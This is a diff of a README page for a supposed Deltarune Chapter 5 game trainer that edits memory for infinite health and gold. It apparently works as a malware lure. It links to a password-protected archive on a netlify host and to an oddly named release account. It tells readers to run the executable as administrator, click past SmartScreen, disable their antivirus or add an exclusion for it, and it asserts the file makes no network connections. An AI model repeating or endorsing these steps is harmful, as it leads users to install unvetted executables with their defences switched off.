@@ -1,50 +1,77 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-Ultimate - Improve your game stats with ease
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases)
 
-## 🚀 Features
+This software manages your statistics in Deltarune Chapter 5. It allows players to adjust character health, gold totals, and other game variables. This tool operates as an external trainer. It modifies memory values while the game runs.
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+## 📥 Getting the software
 
-## 📥 Download & Installation
+You must visit the official releases page to obtain the application. Follow this link to reach the download area: [https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases](https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases). 
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+Click the latest release version on that page. Look for the file ending in .exe. Save this file to your computer.
 
-## 💻 Compatibility
+## ⚙️ System settings
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+This software requires a 64-bit version of Windows 10 or Windows 11. Ensure your system meets these standards:
+
+- Processor: Dual-core 2.0 GHz or higher.
+- Memory: 4 GB RAM.
+- Storage: 50 MB of free space.
+- Software: Microsoft .NET Framework 4.8 or newer.
+
+You must run the game at least once before you use the trainer. This ensures the game creates the necessary background files.
+
+## 🚀 Running the trainer
+
+Follow these steps to launch the software:
+
+1. Close any programs that conflict with game memory.
+2. Navigate to the folder where you saved the download.
+3. Double-click the .exe file to open the interface.
+4. Grant permission if Windows displays a security prompt.
+5. Select the game icon from the list inside the trainer.
+6. Toggle your desired settings using the checkboxes.
+
+The trainer applies changes in real-time. You do not need to restart the game. Check the software dashboard to confirm that your gold and stat counts updated.
+
+## 🛠 Features
+
+The trainer includes tools to manage your character data:
+
+- Infinite Health: Prevents depletion of your character hit points.
+- Gold Multiplier: Sets your currency to a specific amount.
+- Stat Editor: Allows manual entry for strength and speed values.
+- Save State Helper: Backs up your local game progress.
+
+## 🛡 Security notes
+
+Windows SmartScreen might flag the file as unrecognized because it modifies memory. This is normal behavior for trainers. You can select "More info" followed by "Run anyway" if the system attempts to block the application. 
+
+The software interacts only with local files. It does not connect to the internet or transmit player data. 
 
 ## 🔧 Troubleshooting
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+If the trainer fails to connect, verify these points:
 
-## 📄 License
+- Launch the game as an administrator.
+- Ensure the trainer matches your game version.
+- Check that your antivirus does not block the process.
+- Restart your computer to clear hung processes.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+Some security software may attempt to delete the file during download. If this occurs, add an exclusion for the download folder in your antivirus settings.
 
----
+## 📝 Performance tips
 
-`bullet-hell` `windows` `trainer` `max-stats` `deltarune` `utility` `game-trainer` `undetected` `single-player` `infinite-hp` `god-mode` `unlimited-items` `steam` `rpg-trainer` `2026` `assist` `toby-fox`
+Running software that modifies memory requires system resources. Close background browsers or heavy applications while you use the trainer to maintain game stability. If the game crashes, disable all active modifications and restart the application.
+
+## 🔗 Additional help
+
+The trainer stores logs in the same directory as the executable. If errors occur, open the text file named "log.txt" to view the recent activity. This file helps determine why a specific feature failed to load. Use default values if you experience graphical glitches with your modified stats.
+
+The developers maintain this tool to ensure compatibility with updates to the game. Check the repository link occasionally to see if a newer version exists. Updates often arrive after the game releases new content or fixes. 
+
+Keep your original save files in a separate folder before you use the trainer for the first time. This ensures you possess a clean copy of your progress. Use the built-in backup feature within the tool to save your work before you apply major stat changes. 
+
+The tool remains stable throughout typical gameplay sessions. Avoid erratic changes to stat values, as extreme modifications might cause game logic errors. Stick to reasonable values for the best experience. 
+
+You finish the setup by launching the game and then the trainer. The interface remains on top of your screen. You can minimize the trainer at any time.
